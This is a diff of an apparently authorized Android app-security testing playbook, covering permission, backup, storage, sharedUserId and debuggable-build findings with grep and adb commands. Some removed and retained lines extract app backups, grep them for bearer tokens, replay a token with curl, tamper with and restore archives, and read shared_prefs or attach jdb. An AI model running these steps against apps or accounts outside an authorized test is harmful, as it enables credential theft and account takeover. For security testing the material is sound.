-  grep -nE 'USE_EXACT_ALARM|SCHEDULE_EXACT_ALARM|USE_FULL_SCREEN_INTENT' merged.xml
+  grep -nE 'USE_EXACT_ALARM|SCHEDULE_EXACT_ALARM|USE_FULL_SCREEN_INTENT' "$M"
   adb shell dumpsys package com.target.app | grep -i -E 'exact_alarm|full_screen'
   adb shell am compat disable REQUIRE_EXACT_ALARM_PERMISSION com.target.app    # test the pre-12 path
   ```
@@ -1692,7 +1780,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   });
   ```
 - **Proof:** (a) `USE_EXACT_ALARM: granted=true` in `dumpsys` for an app with no alarm or calendar function, with exact alarms then scheduling background wakeups. (b) A full-screen activity rendered over the lock screen after an attacker-influenced notification, recorded on video.
-- **Escalation:** (a) -> D25 persistence. (b) -> D24 (the notification-injection half) -> D13 credential capture.
+- **Escalation:** Dynamic owner: D22-042 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. (a) -> D25 persistence. (b) -> D24 (the notification-injection half) -> D13 credential capture.
 - **Ruled out when:** Neither permission is declared; or `USE_EXACT_ALARM` is held by an app that genuinely is a clock/calendar/timer app, and every full-screen-intent target is a compile-time-constant component with no attacker-controllable extras.
 
 ### D03-061 · `SYSTEM_ALERT_WINDOW` held — and the inverse, the app's own screens undefended against other apps' overlays
@@ -1703,19 +1791,20 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `mobile_security_misconfiguration.tapjacking` (**P5** — a pinned node). This item exists to feed D04's PoC and to remove a triager's "the attacker cannot draw over us" objection, never to be filed alone |
 | **Attacker** | AM-04 — the overlay app needs `SYSTEM_ALERT_WINDOW`, which ATT&CK records as *"at least under certain conditions, automatically granted to applications installed from the Google Play Store"* |
 | **Applies to** | all; `HIDE_OVERLAY_WINDOWS` exists from **Android 12 (API 31)**, so its absence on a `targetSdk >= 31` app is a current gap, not a legacy one |
-| **Maps to** | ATT&CK T1417.002 GUI Input Capture (*"applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows"*; mitigation: *"the `HIDE_OVERLAY_WINDOWS` permission was introduced in Android 12 allowing apps to hide overlay windows of type `TYPE_APPLICATION_OVERLAY` drawn by other apps with the `SYSTEM_ALERT_WINDOW` permission"*), T1417, T1453 |
+| **Requires** | — |
+| **Maps to** | MASTG-TEST-0340, MASWE-0039; ATT&CK T1417.002 GUI Input Capture (*"applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows"*; mitigation: *"the `HIDE_OVERLAY_WINDOWS` permission was introduced in Android 12 allowing apps to hide overlay windows of type `TYPE_APPLICATION_OVERLAY` drawn by other apps with the `SYSTEM_ALERT_WINDOW` permission"*), T1417, T1453 |
 
 - **Test:** Two halves, and the second is the one worth your time. (a) Does the app hold `SYSTEM_ALERT_WINDOW`, and does anything in its own code actually draw a `TYPE_APPLICATION_OVERLAY`? An app holding it with no overlay feature is an over-request row for D03-055. (b) Do the app's consent, payment, permission-request and PIN screens set `filterTouchesWhenObscured` and, on API 31+, `setHideOverlayWindows(true)`?
 - **How:**
   ```bash
   aapt2 d permissions base.apk | grep -E 'SYSTEM_ALERT_WINDOW|HIDE_OVERLAY_WINDOWS'
-  rg -n 'TYPE_APPLICATION_OVERLAY|TYPE_SYSTEM_ALERT|addView\(|WindowManager\.LayoutParams' sources/
-  rg -n 'setHideOverlayWindows|filterTouchesWhenObscured|setFilterTouchesWhenObscured|onFilterTouchEventForSecurity|FLAG_WINDOW_IS_OBSCURED' sources/ res/layout/
+  grep -rnE 'TYPE_APPLICATION_OVERLAY|TYPE_SYSTEM_ALERT|addView\(|WindowManager\.LayoutParams' $SRC/
+  grep -rnE 'setHideOverlayWindows|filterTouchesWhenObscured|setFilterTouchesWhenObscured|onFilterTouchEventForSecurity|FLAG_WINDOW_IS_OBSCURED' $SRC/ $RES/layout/
   adb shell appops get com.target.app SYSTEM_ALERT_WINDOW
   adb shell dumpsys window | grep -i 'APPLICATION_OVERLAY'
   ```
 - **Proof:** Zero hits for `filterTouchesWhenObscured` across the whole codebase and layout set, on an app whose consent or payment confirmation is a single tap — then hand the overlay PoC itself to D04, which owns it. For the holding half, `appops get` showing the op at `allow` on an app with no overlay feature in the UI.
-- **Escalation:** -> D04 tapjacking, with a **named irreversible action**. Google's Mobile VRP excludes tapjacking on a non-security-critical screen with exactly three carve-outs — interfering with a **permission** approval, with an **app-installation** approval, or hiding a **privacy-sensor indicator** — so aim the PoC at one of those three or do not file it. -> D21 when an app-op flip (D03-047) is what silently disables the app's own overlay defence.
+- **Escalation:** Dynamic owner: D04-049..D04-053 / D20-051 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D04 tapjacking, with a **named irreversible action**. Google's Mobile VRP excludes tapjacking on a non-security-critical screen with exactly three carve-outs — interfering with a **permission** approval, with an **app-installation** approval, or hiding a **privacy-sensor indicator** — so aim the PoC at one of those three or do not file it. -> D21 when an app-op flip (D03-047) is what silently disables the app's own overlay defence.
 - **Ruled out when:** Every sensitive screen sets `android:filterTouchesWhenObscured="true"` (or calls `setFilterTouchesWhenObscured(true)`), and on API 31+ the app calls `setHideOverlayWindows(true)` when those screens are foregrounded. Prove the negative rather than asserting it: draw a benign `TYPE_APPLICATION_OVERLAY` with a hole over the target control, tap through it, and record that **no touch was delivered**.
 
 ### D03-062 · `foregroundServiceType` and the sensor held while the app is not visible
@@ -1725,25 +1814,27 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Severity ceiling** | **High** when a sensor is held with no visible indication tied to a user-initiated action; Medium when the retention is disclosed but over-broad |
 | **VRT** | `privacy_concerns.unnecessary_data_collection` (varies), escalating to `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) once the captured data egresses to a named host |
 | **Attacker** | AM-08 (the SDK doing it inside the app); n/a where it is first-party behaviour |
-| **Applies to** | the background-sensor cut-off is **Android 9+**; a declared `foregroundServiceType` is mandatory from **Android 10 (API 29)** and tightened again in Android 14; camera/microphone status indicators arrived in **Android 12** |
+| **Applies to** | the background-sensor cut-off is **Android 9+**; a declared `foregroundServiceType` is mandatory from **Android 10 (API 29)**; on **API 34+** each type needs its `FOREGROUND_SERVICE_<TYPE>` permission and, for camera/microphone/location, a runtime grant and a while-in-use start path — `specialUse` with a `PROPERTY_SPECIAL_USE_FGS_SUBTYPE` string is the opt-out, so read the subtype string and treat a sensor hold under `specialUse` as undisclosed; camera/microphone status indicators arrived in **Android 12** |
 | **Requires** | device, api>=29 |
 | **Maps to** | ATT&CK T1541 Foreground Persistence — apps *"can retain sensor access by running in the foreground, using Android's `startForeground()` API method"*, and *"the only requirement is displaying a persistent notification, which malicious actors can spoof to appear legitimate"*; Mandrake *"uses transparent notifications to hide foreground service activity"*. Also T1429 Audio Capture, T1512 Video Capture, T1430 Location Tracking |
 
 - **Test:** `startForeground()` is the documented way to keep sensor access after Android 9 cut background sensors off, so the foreground-service type list in the merged manifest is a capability declaration. Enumerate the declared types, then check whether the app holds camera, microphone or location while its UI is not visible — and whether the notification it must post actually tells the user which sensor is live.
 - **How:**
   ```bash
-  grep -nE 'foregroundServiceType|FOREGROUND_SERVICE' merged.xml
-  rg -n 'startForeground|ServiceInfo\.FOREGROUND_SERVICE_TYPE|NotificationChannel|setSmallIcon' sources/
-  adb shell am start -n com.target.app/.MainActivity
+  grep -nE 'foregroundServiceType|FOREGROUND_SERVICE' "$M"
+  grep -nE 'foregroundServiceType="[^"]*specialUse|PROPERTY_SPECIAL_USE_FGS_SUBTYPE' "$M"   # the API 34 catch-all and its declared subtype string
+  grep -oE 'android.permission.FOREGROUND_SERVICE_[A-Z_]+' "$M" | sort -u                       # typed permissions actually declared (API 34+)
+  grep -rnE 'startForeground|ServiceInfo\.FOREGROUND_SERVICE_TYPE|NotificationChannel|setSmallIcon' $SRC/
+  adb shell am start -S -W -n com.target.app/.MainActivity
   adb shell input keyevent KEYCODE_HOME                     # app is now not visible
-  adb shell dumpsys activity services com.target.app | rg -n 'isForeground|foregroundServiceType|startForeground'
+  adb shell dumpsys activity services com.target.app | grep -nE 'isForeground|foregroundServiceType|startForeground'
   adb shell dumpsys media.camera | grep -i com.target.app
-  adb shell dumpsys audio | rg -n 'com.target.app|RECORD'
+  adb shell dumpsys audio | grep -nE 'com.target.app|RECORD'
   adb shell dumpsys location | sed -n '/Active Requests/,/^$/p'
   adb shell screencap -p /sdcard/statusbar.png && adb pull /sdcard/statusbar.png
   ```
-- **Proof:** `dumpsys activity services` showing the service foreground while the app's UI is not visible, and `dumpsys media.camera` / `dumpsys audio` / `dumpsys location` showing the package holding the sensor at that same moment — plus the status-bar screenshot showing a transparent or uninformative notification. The egress half comes from the proxy, in the same sitting.
-- **Escalation:** -> D20 privacy track once the destination host is named; the location variant then joins the BOLA test on the history endpoint in D03-063 and D15, which is where this class reaches its highest severity.
+- **Proof:** `dumpsys activity services` showing the service foreground while the app's UI is not visible, and `dumpsys media.camera` / `dumpsys audio` / `dumpsys location` showing the package holding the sensor at that same moment (with the `specialUse` subtype string quoted next to the hold when that type is declared) — plus the status-bar screenshot showing a transparent or uninformative notification. The egress half comes from the proxy, in the same sitting.
+- **Escalation:** Dynamic owner: D06-041 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D20 privacy track once the destination host is named; the location variant then joins the BOLA test on the history endpoint in D03-063 and D15, which is where this class reaches its highest severity.
 - **Ruled out when:** With the app backgrounded, `dumpsys media.camera`, `dumpsys audio` and `dumpsys location` all show no hold; **or** every hold is bounded by a user-initiated action (a recording the user started, a navigation session the user began) and the posted notification names the sensor. Capture the empty `Active Requests` block and the sensor-free `dumpsys media.camera` as the evidence for the negative.
 
 ### D03-063 · `ACCESS_BACKGROUND_LOCATION` and the always-on location posture
@@ -1761,7 +1852,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **How:**
   ```bash
   aapt2 d permissions base.apk | grep -E 'ACCESS_(COARSE|FINE|BACKGROUND)_LOCATION'
-  rg -n 'requestLocationUpdates|FusedLocationProviderClient|setPriority|PRIORITY_HIGH_ACCURACY|Geofenc' sources/
+  grep -rnE 'requestLocationUpdates|FusedLocationProviderClient|setPriority|PRIORITY_HIGH_ACCURACY|Geofenc' $SRC/
   adb shell dumpsys location | sed -n '/Active Requests/,/^$/p'
   adb shell appops get com.target.app COARSE_LOCATION
   adb shell appops get com.target.app FINE_LOCATION
@@ -1779,19 +1870,20 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) — argue the special-category nature explicitly |
 | **Attacker** | AM-08 / AM-09 |
 | **Applies to** | apps integrating Health Connect; Android 14+ ships it as a platform component. At **targetSdk 36+** the granular `android.permission.health.READ_HEART_RATE` etc. **replace** `BODY_SENSORS`, and `READ_HEALTH_DATA_IN_BACKGROUND` replaces `BODY_SENSORS_BACKGROUND`. |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/health-and-fitness/guides/health-connect/plan/data-types` (the exact permission strings); `developer.android.com/health-and-fitness/guides/health-connect` (`HealthConnectClient`, `READ_HEALTH_DATA_IN_BACKGROUND`, `READ_HEALTH_DATA_HISTORY`, and the required privacy-policy activity with `android.intent.action.VIEW_PERMISSION_USAGE`) |
 
 - **Test:** `android.permission.health.*` is a large, granular, per-data-type family covering reproductive health (`READ_MENSTRUATION`, `READ_SEXUAL_ACTIVITY`), glucose, blood pressure and mental wellness (`READ_MINDFULNESS`), plus two force multipliers: `READ_HEALTH_DATA_IN_BACKGROUND` and `READ_HEALTH_DATA_HISTORY`. Audit what the app declares against what it functionally needs, and whether the rationale/privacy-policy activity is a real disclosure or a stub.
 - **How:**
   ```bash
-  grep -n 'android.permission.health' merged.xml | sort
-  grep -n 'VIEW_PERMISSION_USAGE\|ACTION_SHOW_PERMISSIONS_RATIONALE\|ViewPermissionUsageActivity' merged.xml
+  grep -n 'android.permission.health' "$M" | sort
+  grep -n 'VIEW_PERMISSION_USAGE\|ACTION_SHOW_PERMISSIONS_RATIONALE\|ViewPermissionUsageActivity' "$M"
   adb shell dumpsys package com.target.app | grep -A40 'runtime permissions' | grep health
   # and the legacy path that bypasses the Health Connect decision entirely:
-  grep -rnE 'BODY_SENSORS|TYPE_HEART_RATE|health\.READ_HEART_RATE' merged.xml sources/
+  grep -rnE 'BODY_SENSORS|TYPE_HEART_RATE|health\.READ_HEART_RATE' "$M" $SRC/
   ```
 - **Proof:** Declared `android.permission.health.READ_SEXUAL_ACTIVITY` plus `READ_HEALTH_DATA_IN_BACKGROUND` in an app with no corresponding feature, with the data appearing in a network request. Or, for the bypass variant, `BODY_SENSORS` declared at `targetSdk=36` alongside a code path reading heart rate through a raw `Sensor.TYPE_HEART_RATE` or vendor SDK route that never touches the user's Health Connect decision.
-- **Escalation:** -> D20 data-safety mismatch; -> D15 if the backend stores it unencrypted or exposes it by a guessable identifier (that combination is the Critical version).
+- **Escalation:** Dynamic owner: D22-059 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D20 data-safety mismatch; -> D15 if the backend stores it unencrypted or exposes it by a guessable identifier (that combination is the Critical version).
 - **Ruled out when:** Every declared `health.*` permission maps to a visible feature, the app ships a real `VIEW_PERMISSION_USAGE` rationale activity with substantive content, and no non-Health-Connect sensor route reads the same data types.
 
 ### D03-065 · `MANAGE_EXTERNAL_STORAGE` / `requestLegacyExternalStorage` — the scoped-storage escape
@@ -1802,19 +1894,20 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (**P4**) |
 | **Attacker** | AM-04 (a second app with storage/media access) |
 | **Applies to** | `requestLegacyExternalStorage` is honoured only at **targetSdk 29**; ignored from targetSdk 30. `MANAGE_EXTERNAL_STORAGE` (API 30+) is the modern equivalent and is Play-policy restricted — its presence is itself worth chasing. Granular `READ_MEDIA_*` replaced `READ_EXTERNAL_STORAGE` at **API 33**. |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0254 context; MASWE-0066; the corpus's warning that a scoped-storage-era "external storage" claim must show the actual read path |
 
 - **Test:** Two halves: does the app opt out of scoped storage or hold "All files access", and — the half that decides severity — does it then *write sensitive data* to shared storage under that opt-out, where any app with read access sees it?
 - **How:**
   ```bash
-  grep -oE 'requestLegacyExternalStorage="[^"]*"|preserveLegacyExternalStorage="[^"]*"' merged.xml
-  grep -oE 'MANAGE_EXTERNAL_STORAGE|WRITE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_[A-Z]+' merged.xml
+  grep -oE 'requestLegacyExternalStorage="[^"]*"|preserveLegacyExternalStorage="[^"]*"' "$M"
+  grep -oE 'MANAGE_EXTERNAL_STORAGE|WRITE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_[A-Z]+' "$M"
   adb shell ls -laR /sdcard/Android/data/com.target/ /sdcard/Download/ /sdcard/Android/media/com.target/ 2>/dev/null
-  grep -rnE 'getExternalStorage|getExternalFilesDir|MediaStore' sources/
+  grep -rnE 'getExternalStorage|getExternalFilesDir|MediaStore' $SRC/
   ```
   Then read it back **from a second installed app**, not from `adb shell` — the read path is the finding.
 - **Proof:** A file under `/sdcard/` containing tokens, PII or a downloaded document, read successfully by a second app you install. Name the read path explicitly (`MANAGE_EXTERNAL_STORAGE`, MediaStore, the Downloads collection, or `Android/media` which sits outside the per-app SELinux category sandbox).
-- **Escalation:** -> D11 plaintext-token theft -> D13 ATO. Note that scoped storage from targetSdk 29 (enforced 30) means `/sdcard/Android/data/<pkg>` is **not** freely readable on a modern target — an external-storage claim without a demonstrated read path is the single most common over-claim in mobile reports.
+- **Escalation:** Dynamic owner: D11-042 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D11 plaintext-token theft -> D13 ATO. Note that scoped storage from targetSdk 29 (enforced 30) means `/sdcard/Android/data/<pkg>` is **not** freely readable on a modern target — an external-storage claim without a demonstrated read path is the single most common over-claim in mobile reports.
 - **Ruled out when:** No legacy opt-out, no `MANAGE_EXTERNAL_STORAGE`, and nothing sensitive written outside `getFilesDir()`/`getExternalFilesDir()` — or, where it is written outside, a second app on a scoped-storage device cannot read it.
 
 ### D03-066 · Privileged-permission tiers on preloaded and OEM apps
@@ -1853,12 +1946,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) escalating through whatever the sibling holds |
 | **Attacker** | AM-08 (compromise the weak sibling) / AM-11 |
 | **Applies to** | all. **LEGACY declaration** — `android:sharedUserId` deprecated at API 29, deprecated for new users from Android 13 — but still honoured. The documented migration is `android:sharedUserMaxSdkVersion="32"`, and the docs warn **not** to remove `android:sharedUserId` (that breaks updates), so both attributes must be read together. |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/guide/topics/manifest/manifest-element#uid` — apps sharing it *"can access each other's data"* and *"can optionally run in the same process"*; *"apps cannot remove `android:sharedUserId` entirely — migrating off a shared user ID is not supported"*; `developer.android.com/about/versions/13/behavior-changes-all`; AOSP `Permissions.md` — *"shared UIDs share a single permission grant-set"*; AOSP security-model paper §4.3.3 |
 
 - **Test:** Apps with the same `android:sharedUserId` and identical signing certificates share one Linux UID, one permission grant-set, and read each other's private data directories. The target's effective attack surface becomes the **union** of every sibling's exported components, and its effective permission set becomes the union of every sibling's permissions. Then verify which migration branch the *tested device* is on: `sharedUserMaxSdkVersion` only takes effect for installs on API 33+, so the same manifest behaves differently on two devices.
 - **How:**
   ```bash
-  grep -nE 'sharedUserId|sharedUserMaxSdkVersion' merged.xml
+  grep -nE 'sharedUserId|sharedUserMaxSdkVersion' "$M"
   adb shell dumpsys package com.target.app | grep -E 'sharedUser|userId='
   UID=$(adb shell dumpsys package com.target.app | grep -oE 'userId=[0-9]+' | head -1 | cut -d= -f2)
   adb shell pm list packages -U | grep ":$UID\b"        # the sibling set
@@ -1870,7 +1964,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb shell run-as com.target.helper ls -l /data/data/com.target.app/shared_prefs/
   ```
 - **Proof:** Two package names resolving to the same numeric `userId=` in `dumpsys package`, the same `u0_aNNN` in `ps -Z`, and a successful directory listing (or file read) of one package's `/data/data/...` from the other's context.
-- **Escalation:** Compromise the weakest sibling -> read the strongest sibling's shared prefs, databases and Keystore-adjacent files, and inherit its permissions. Same UID means the **same Keystore namespace** (-> D12). Combined with a global `android:process` name (D03-038), attacker code executes inside the target's own process. It is also the mechanism behind app-level virtualisation abuse: a guest running under the host UID inherits all host-granted permissions even without declaring them (-> D25).
+- **Escalation:** Dynamic owner: D01-040 / D25-012 / D22-024 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. Compromise the weakest sibling -> read the strongest sibling's shared prefs, databases and Keystore-adjacent files, and inherit its permissions. Same UID means the **same Keystore namespace** (-> D12). Combined with a global `android:process` name (D03-038), attacker code executes inside the target's own process. It is also the mechanism behind app-level virtualisation abuse: a guest running under the host UID inherits all host-granted permissions even without declaring them (-> D25).
 - **Ruled out when:** No `sharedUserId` is declared; or it is declared alongside `android:sharedUserMaxSdkVersion` **and** the tested device's API level is above that value, confirmed by `dumpsys package` showing a distinct `userId=` per package on that device. Verify this on the device, not from the manifest — the branch is install-time.
 
 ### D03-068 · `allowBackup` — the flag is P5; the finding is the credential you extract and replay
@@ -1887,23 +1981,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** `allowBackup="true"` (and the attribute missing, which defaults to true) is not a finding. The finding is a file in the extracted archive holding a credential, and the replay of that credential against the production API. Bugcrowd's baseline vector is `AV:P` — physical — which is exactly why the flag alone caps at P5; the way above P5 is to remove the physical precondition.
 - **How:**
   ```bash
-  grep -oE 'android:(allowBackup|fullBackupContent|dataExtractionRules)="[^"]*"' merged.xml
-  # legacy adb path (try it, and record whether it works at all on the in-scope device)
-  adb backup -f app.ab -noapk -nosystem -noshared com.target.app
-  python3 -c "import zlib;open('app.tar','wb').write(zlib.decompress(open('app.ab','rb').read()[24:]))"
-  tar tvf app.tar | grep -Ei 'shared_prefs|databases|\.xml|\.db'
-  # modern path — bmgr local transport, no debuggable flag needed (MASTG-TECH-0128)
-  adb shell bmgr enable true
-  adb shell bmgr list transports
-  adb shell bmgr transport com.android.localtransport/.LocalTransport
-  adb shell bmgr backupnow com.target.app
-  adb root && adb pull /data/data/com.android.localtransport/files/1/_full/com.target.app pkg.ab
-  tar xvf pkg.ab && grep -rInE '(eyJ[A-Za-z0-9_-]{10,}|refresh_token|session|Bearer)' apps/com.target.app/
+  grep -oE 'android:(allowBackup|fullBackupContent|dataExtractionRules|backupAgent|restoreAnyVersion)="[^"]*"' "$M"
+  cat $RES/xml/data_extraction_rules.xml $RES/xml/backup_rules.xml 2>/dev/null
+  # record the declaration in inventory/manifest-flags.csv; the extraction, the rig and the replay live in D11-051/D11-058
   ```
-  Then replay: `curl -H "Authorization: Bearer <token>" https://api.target.example/v1/me`.
-- **Proof:** The archive path and field name of the recovered token, quoted verbatim, **plus** an HTTP 200 from the production API returning the victim's profile with that token. Or, for the restore variant, `adb restore app.ab` on a second device with the app opening already authenticated.
+  The extraction routes and which attacker each one belongs to: (a) cloud restore — sign a second device into the test account, restore, show the app authenticated (D03-069 `<cloud-backup>`, AM-05); (b) device-to-device transfer when `<device-transfer>` does not exclude the file (D22-014); (c) `adb backup` only where the device is Android ≤ 11 or the app is debuggable (D02-031, D22-076, AM-11). A `bmgr` local-transport dump needs `adb root` to read the transport's files: it is a **lab-only content check** that proves what the backup set contains, never that an attacker can obtain it (D11-058 builds that rig). Then replay the artefact against production (D13).
+- **Proof:** The attribute values and the rules XML quoted from `"$M"` / `$RES/xml/`, recorded in `inventory/manifest-flags.csv`; then, when D11-051's extraction over an attacker-reachable route yields a credential: the archive path and field name of the recovered token, quoted verbatim, **plus** an HTTP 200 from the production API returning the victim's profile with that token. Or, for the restore variant, `adb restore app.ab` on a second device with the app opening already authenticated.
 - **Escalation:** -> D11 (what else is in the archive), D13 (session resumption), D15 (everything the session reaches). To get above P5 you must show the credential surviving into a **cloud** backup or a device-to-device transfer restored on an attacker-controlled device — that removes `AV:P` and is where the severity actually lives.
-- **Ruled out when:** Both extraction paths fail on the in-scope device **or** the archive contains nothing that authenticates. Note explicitly which: Google's own invalid-reports page states *"we don't consider it a security vulnerability if an app allows backups"*, Xiaomi lists `allowbackup:True` as out of scope, and Samsung downgrades reports that *"require enabling Developer Mode ... persistently on the device"*. If the only path needed root or developer mode, stop and re-hunt the same data through an exported provider (D07) instead.
+- **Ruled out when:** Every attacker-reachable route (a)–(c) fails on the in-scope device **or** the archive contains nothing that authenticates (D11-051 runs the extraction; a root-only `bmgr` read is not a route). Note explicitly which: Google's own invalid-reports page states *"we don't consider it a security vulnerability if an app allows backups"*, Xiaomi lists `allowbackup:True` as out of scope, and Samsung downgrades reports that *"require enabling Developer Mode ... persistently on the device"*. If the only path needed root or developer mode, stop and re-hunt the same data through an exported provider (D07) instead.
 
 ### D03-069 · `dataExtractionRules` — cloud backup and device transfer are configured **separately**
 
@@ -1919,11 +2004,11 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Read the referenced rules file, not the attribute. `allowBackup="true"` with a rules file that excludes `databases/` and `shared_prefs/` is **not** a finding. Conversely, `dataExtractionRules` defines `<cloud-backup>` and `<device-transfer>` as independent sections — an app can exclude the token store from one and not the other, and D2D transfer is the channel with no physical-access precondition.
 - **How:**
   ```bash
-  grep -oE 'android:(fullBackupContent|dataExtractionRules)="[^"]*"' merged.xml
-  cat out/res/xml/data_extraction_rules.xml out/res/xml/backup_rules.xml 2>/dev/null
+  grep -oE 'android:(fullBackupContent|dataExtractionRules)="[^"]*"' "$M"
+  cat $RES/xml/data_extraction_rules.xml $RES/xml/backup_rules.xml 2>/dev/null
   # read BOTH sections independently
-  xmlstarlet sel -t -c "//data-extraction-rules/cloud-backup"   out/res/xml/data_extraction_rules.xml
-  xmlstarlet sel -t -c "//data-extraction-rules/device-transfer" out/res/xml/data_extraction_rules.xml
+  xmlstarlet sel -t -c "//data-extraction-rules/cloud-backup"   $RES/xml/data_extraction_rules.xml
+  xmlstarlet sel -t -c "//data-extraction-rules/device-transfer" $RES/xml/data_extraction_rules.xml
   # drozer: run app.package.backup -a com.target.app
   ```
   Confirm that the file actually excludes the specific sharedpref/database entries holding tokens:
@@ -1949,31 +2034,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Everyone reads the backup in one direction. The other direction is where the severity is: extract, **edit**, restore, and see which of the app's own client-side decisions the restored data controls — a `premium=true` flag, a failed-PIN counter, a stored API host, a "biometric enrolled" boolean, a cached entitlement, an onboarding-complete marker that skips KYC. `android:restoreAnyVersion="true"` additionally allows an **older** archive to be restored over a newer install, which re-introduces whatever the newer version fixed. A custom `android:backupAgent` means the include/exclude rules are not the whole story — read its `onRestore`/`onRestoreFile` implementation.
 - **How:**
   ```bash
-  grep -nE 'allowBackup|backupAgent|restoreAnyVersion|fullBackupOnly|killAfterRestore|fullBackupContent|dataExtractionRules' merged.xml
-  rg -n 'BackupAgent|BackupAgentHelper|onBackup\(|onRestore\(|onRestoreFile\(' sources/
-  adb backup -f app.ab -noapk com.target.app
-  python3 -c "import zlib; open('app.tar','wb').write(zlib.decompress(open('app.ab','rb').read()[24:]))"
-  tar xf app.tar
-  # edit the decision the CLIENT makes locally, e.g. apps/com.target.app/sp/settings.xml
-  tar cf mod.tar apps/
-  python3 - <<'PY'
-  import zlib
-  hdr = open('app.ab', 'rb').read(24)
-  open('mod.ab', 'wb').write(hdr + zlib.compress(open('mod.tar', 'rb').read()))
-  PY
-  adb restore mod.ab
-  adb shell am start -n com.target.app/.MainActivity
+  grep -nE 'allowBackup|backupAgent|restoreAnyVersion|fullBackupOnly|killAfterRestore|fullBackupContent|dataExtractionRules' "$M"
+  grep -rnE 'BackupAgent|BackupAgentHelper|onBackup\(|onRestore\(|onRestoreFile\(' $SRC/
+  # record the declaration (and the custom agent class) in inventory/manifest-flags.csv
   ```
-  On a modern device where `adb backup` returns an empty archive, take the same question to the `bmgr` local transport instead:
-  ```bash
-  adb shell bmgr enable true
-  adb shell bmgr transport com.android.localtransport/.LocalTransport
-  adb shell bmgr backupnow com.target.app
-  adb root && adb pull /data/data/com.android.localtransport/files/1/_full/com.target.app pkg.ab
-  ```
+  The tamper-and-restore recipe (extract, edit, re-pack, restore, five-shot state change) is owned by D23-004 on the D11-058 rig; the archive must be restored through an attacker-reachable route — cloud restore (a), device-to-device transfer (b) or `adb restore` on a device/build where `adb backup` still works (c), as listed in D03-068. A `bmgr` local-transport dump pulled with `adb root` is a lab-only content check and never the restore route of the finding.
 - **Proof:** The five-shot state-change set, taken in one sitting: (1) pre-state — the feature locked / the PIN counter at its limit; (2) the edit, with the exact file and key visible; (3) negative post-state — the old value gone; (4) positive post-state — the app opening in the tampered state; (5) the side effect — a request in the proxy to the host you wrote into the restored preference. For `restoreAnyVersion`, an archive from an older `versionCode` accepted over a newer install.
 - **Escalation:** -> D11 (the storage layer that trusted the restored value), D23 (entitlement), D13 (app-lock or PIN bypass), D14/D15 when a backend host came out of a restored preference. File the archive-tamper primitive and the state it unlocks as separate reports.
-- **Ruled out when:** `adb backup` returns a header-only archive on the in-scope device (Android 12+ commonly does) **and** the `bmgr` local-transport route yields nothing either; **or** every restored value is re-derived from the server on next launch — prove that by restoring the tampered archive and showing the app overwriting or ignoring the edited key; **or** `dataExtractionRules` excludes every preference and database that carries a locally-made decision. "The rules file exists" is not the negative; the restore that failed to change behaviour is.
+- **Ruled out when:** no attacker-reachable route (a)–(c) restores a tampered archive on the in-scope device (D23-004 records which were tried; a root-only `bmgr` read does not count either way); **or** every restored value is re-derived from the server on next launch — prove that by restoring the tampered archive and showing the app overwriting or ignoring the edited key; **or** `dataExtractionRules` excludes every preference and database that carries a locally-made decision. "The rules file exists" is not the negative; the restore that failed to change behaviour is.
 
 ### D03-071 · `android:debuggable` and `android:testOnly` in a shipped build
 
@@ -1984,24 +2052,18 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Attacker** | AM-11 (physical unlocked with USB debugging) |
 | **Applies to** | all. Play blocks debuggable uploads, so this is found most often in enterprise, sideloaded, pre-prod and OEM channels — check every distribution channel in scope, not just the store build. |
 | **Requires** | device |
-| **Maps to** | `developer.android.com/privacy-and-security/risks/android-debuggable`; MobSF `app_in_test_mode` for `testOnly`; drozer `app.package.debuggable` |
+| **Maps to** | MASTG-TEST-0226; `developer.android.com/privacy-and-security/risks/android-debuggable`; MobSF `app_in_test_mode` for `testOnly`; drozer `app.package.debuggable` |
 
 - **Test:** A debuggable release lets any local principal attach JDWP, read and rewrite live memory, and `run-as` the package regardless of device root state. `testOnly="true"` means the release pipeline shipped a test artefact — Google's own description is that it *"may expose functionality or data outside of itself that would cause a security hole"*.
 - **How:**
   ```bash
   aapt2 dump badging base.apk | grep -E "application-debuggable|testOnly"
-  grep -nE 'android:debuggable|android:testOnly' merged.xml
+  grep -nE 'android:debuggable|android:testOnly' "$M"
   adb shell dumpsys package com.target.app | grep -i 'flags='       # DEBUGGABLE / TEST_ONLY
-  adb shell run-as com.target.app id
-  adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml
-  adb jdwp                                        # the pid appears only if debuggable
-  adb shell am set-debug-app -w com.target.app
-  adb forward tcp:8700 jdwp:<pid>
-  jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
-  #   stop in com.target.LoginActivity.onClick ; locals ; next ; set <var> = "..."
